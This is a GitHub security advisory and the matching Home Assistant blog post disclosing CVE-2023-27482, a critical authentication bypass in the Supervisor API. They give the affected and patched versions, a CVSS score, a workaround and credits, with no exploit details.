    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhome-assistant%2Fcore%2Fsecurity%2Fadvisories%2FGHSA-2j8f-h4mr-qr25)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=home-assistant%2Fcore)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[home-assistant](/home-assistant)
/
**[core](/home-assistant/core)**
Public

* [Notifications](/login?return_to=%2Fhome-assistant%2Fcore) You must be signed in to change notification settings
* [Fork
  31.9k](/login?return_to=%2Fhome-assistant%2Fcore)
* [Star
   75.8k](/login?return_to=%2Fhome-assistant%2Fcore)

* [Code](/home-assistant/core)
* [Issues
  2.9k](/home-assistant/core/issues)
* [Pull requests
  480](/home-assistant/core/pulls)
* [Actions](/home-assistant/core/actions)
* [Projects
  2](/home-assistant/core/projects)
* [Security](/home-assistant/core/security)
* [Insights](/home-assistant/core/pulse)

Additional navigation options

* [Code](/home-assistant/core)
* [Issues](/home-assistant/core/issues)
* [Pull requests](/home-assistant/core/pulls)
* [Actions](/home-assistant/core/actions)
* [Projects](/home-assistant/core/projects)
* [Security](/home-assistant/core/security)
* [Insights](/home-assistant/core/pulse)

# Authentication bypass Supervisor API

Critical

[frenck](/frenck)
published
GHSA-2j8f-h4mr-qr25
Mar 8, 2023

## Package

Home Assistant Core

## Affected versions

<2023.3.2

## Patched versions

2023.3.2

Home Assistant Supervisor

<2023.03.3

2023.03.3

## Description

### Impact

A remotely exploitable vulnerability bypassing authentication for accessing the Supervisor API through Home Assistant has been discovered.

This impacts all Home Assistant installation types that use the Supervisor 2023.03.2 or older.

* Home Assistant OS
* Home Assistant Supervised

Other installation types, like Home Assistant Container (for example Docker), or Home Assistant Core manually in a Python environment, are not affected.

### Patches

The issue has been mitigated and closed in Supervisor version 2023.03.3, which has been rolled out to all affected installations via the auto-update feature of the Supervisor. This rollout has been completed at the time of publication of this advisory.

Home Assistant Core 2023.3.2 included mitigation for this vulnerability. Upgrading to at least that version is thus advised.

### Workarounds

In case one is not able to upgrade the Home Assistant Supervisor or the Home Assistant Core application at this time, it is advised to not expose your Home Assistant instance to the internet.

### Credits

The security issue was found by [Joseph Surin](https://jsur.in) from [elttam](https://www.elttam.com/). Many thanks for bringing this to [our attention](https://www.home-assistant.io/security).

### References

* <https://www.home-assistant.io/blog/2023/03/08/supervisor-security-disclosure/>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27482>

### Edit history

* Adjusted Home Assistant Core version to 2023.3.2
* Adjusted Home Assistant Supervisor version to 2023.03.3

### Severity

Critical

10.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2023-27482

### Weaknesses

No CWEs

### Credits

* [![@josephsurin](https://avatars.githubusercontent.com/u/14977484?s=40&v=4)](/josephsurin)
  [josephsurin](/josephsurin)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.home-assistant.io_a6c500a2_20250114_200004.html ===


[2025.1.2](/blog/2025/01/03/release-20251/ "Latest version 2025.1.2 released January  9, 2025")

* [Getting started](/installation/)
* [Documentation](/docs/)
  + [Installation](/installation/)
  + [Automations](/docs/automation/)
  + [Dashboards](/dashboards/)
  + [Voice assistants](/voice_control/)
  + [Device organization](/docs/organizing/)
  + [Energy management](/docs/energy/)
  + [Advanced configuration](/docs/configuration/)
* [Integrations](/integrations/)
* [Blog](/blog/)
* [Need help?](/help/)

# On this page

* [Affected version](#affected-version)
* [Credits](#credits)
* [About the issue](#about-the-issue)
* [FAQ](#faq)
  + [Has this vulnerability been abused?](#has-this-vulnerability-been-abused)
  + [Is there a workaround?](#is-there-a-workaround)

# Disclosure: Supervisor security vulnerability

[![Paulus Schoutsen](https://avatars.githubusercontent.com/balloob?size=64) Paulus Schoutsen](https://github.com/balloob)

 March 08, 2023

* [Public-Service-Announcement](/blog/categories/public-service-announcement/)

[Comments](#post-comments)

![Attention please read](/images/blog/2023-03-supervisor-security-disclosure/social.png)

We were made aware of a security issue impacting installations using
the Home Assistant Supervisor. A fix for this security issue has been rolled
out to all affected Home Assistant users via the Supervisor auto-update system
and this issue is no longer present.

You can verify that you received the update on the [Home Assistant About page](https://my.home-assistant.io/redirect/info)
and verify that you are running Supervisor 2023.03.1 or later. If you do not
see a Supervisor version on your About page, you do not use one of the affected
installation types and have not been vulnerable.

The issue has also been mitigated in Home Assistant 2023.3.0. This version
was released on March 1 and has since been installed by [33% of our users](https://analytics.home-assistant.io/).

## Affected version

The security issue affected installation types Home Assistant OS and
Home Assistant Supervised. This includes installations running on the
Home Assistant Blue and Home Assistant Yellow.

The two other installation types, Home Assistant Container (Docker) and
Home Assistant Core (own Python environment), have not been affected.

## Credits

The security issue was found by [Joseph Surin](https://jsur.in) from [elttam](https://www.elttam.com/). Many thanks for bringing this to our attention.

## About the issue

The Supervisor is an application that is part of Home Assistant OS
and Home Assistant Supervised installations and is responsible for
system management. The issue allowed an attacker to remotely bypass
authentication and interact directly with the Supervisor API. This gives
an attacker access to install Home Assistant updates and manage add-ons
and backups. Our analysis shows that this issue has been in Home Assistant
since the introduction of the Supervisor in 2017.

We have published [security advisory CVE-2023-27482 on GitHub](https://github.com/home-assistant/core/security/advisories/GHSA-2j8f-h4mr-qr25).

## FAQ

---

### Has this vulnerability been abused?

We don’t know. We have not heard any reports of people being hacked.

### Is there a workaround?

In case one is not able to upgrade the Home Assistant Supervisor or the
Home Assistant Core application at this time, it is advised to not expose
your Home Assistant instance to the internet.

# Share this post

* [Tweet](https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.home-assistant.io%2Fblog%2F2023%2F03%2F08%2Fsupervisor-security-disclosure%2F&text=Disclosure%3A+Supervisor+security+vulnerability+via+%40home_assistant)
* [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.home-assistant.io%2Fblog%2F2023%2F03%2F08%2Fsupervisor-security-disclosure%2F)

# Recent Posts

* [3…2…1… Backup](/blog/2025/01/03/3-2-1-backup/)
* [2025.1: Backing Up into 2025!](/blog/2025/01/03/release-20251/)
* [The era of open voice assistants has arrived](/blog/2024/12/19/voice-preview-edition-the-era-of-open-voice/)
* [Voice Chapter 8 - Assist in the home today](/blog/2024/12/19/voice-chapter-8-assist-in-the-home/)
* [Understanding Our Community: The 2024 Home Assistant Survey](/blog/2024/12/16/community-survey-2024/)

# On this page

* [Affected version](#affected-version)
* [Credits](#credits)
* [About the issue](#about-the-issue)
* [FAQ](#faq)
  + [Has this vulnerability been abused?](#has-this-vulnerability-been-abused)
  + [Is there a workaround?](#is-there-a-workaround)

![Home Assistant](/images/footer-logo-text.svg)

Home Assistant is a project from the [Open Home Foundation](https://www.openhomefoundation.org/), sponsored by [Nabu Casa](https://www.nabucasa.com/).

### Join us and contribute!

* [GitHub repo](https://github.com/home-assistant/)
* [Developers Portal](https://developers.home-assistant.io)
* [Design Portal](https://design.home-assistant.io)
* [Data Science Portal](https://data.home-assistant.io)
* [Community Forum](https://community.home-assistant.io)
* [Reporting issues](/help/reporting_issues/)
* [Community Merch Store](https://home-assistant-store.creator-spring.com/)

### System status

* [Integration Alerts](https://alerts.home-assistant.io)
* [Security Alerts](/security/)
* [System Status](https://status.home-assistant.io)

### Companion apps

* [iOS and Apple devices](https://apps.apple.com/us/app/home-assistant/id1099568401)
* [Android and Wear OS](https://play.google.com/store/apps/details?id=io.homeassistant.companion.android)
* [...and more!](https://companion.home-assistant.io/)

### Governance

* [Privacy Notices](/privacy/)
* [Contributor License Agreement](/developers/cla/)
* [Terms of Service](/tos/)
* [Code of Conduct](/code_of_conduct/)
* [Credits](/developers/credits/)
* [License](/developers/license/)

### Follow us

[Sign up for our newsletter](https://building.open-home.io/#/portal)

Contact us [here](/cdn-cgi/l/email-protection#96fef3fafaf9d6fef9fbf3bbf7e5e5ffe5e2f7f8e2b8fff9) for media and partnership inquiries. (No technical support!)

Website powered by [Jekyll](https://jekyllrb.com/)

Originally based on the [Oscailte theme](https://github.com/coogie/oscailte)

[![Deploys by Netlify Badge](/images/frontpage/netlify.svg)](https://www.netlify.com)


